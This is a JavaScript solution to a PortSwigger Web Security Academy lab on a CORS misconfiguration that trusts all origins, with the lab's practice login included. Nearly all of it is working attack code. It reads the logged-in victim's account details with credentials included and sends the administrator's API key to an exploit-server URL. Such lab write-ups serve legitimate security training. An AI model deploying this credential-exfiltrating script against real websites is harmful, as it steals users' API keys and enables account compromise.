/*

This website has an insecure CORS configuration in that it trusts all origins.
To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
*/



// Malicious code below. Copy/paste into the "Body" section of the exploit server page, enclosed in <script> tags


const lab_serv = '0a7f0065040c089a81cba70600c400f1' //Change burp exercise lab id accordingly
const exploit_serv =  '0a9300a3047008a681b8a6c7016a0051' //Change burp exercise exploit id accordingly


function reqListener() {
    fetch('https://' + lab_serv + '.web-security-academy.net/accountDetails', {credentials: 'include',}).then( async (response) => {
        let data = await response.json(); 
        fetch('https://exploit-' + exploit_serv + '.exploit-server.net/log?key=' + data.apikey);
    });
}

reqListener()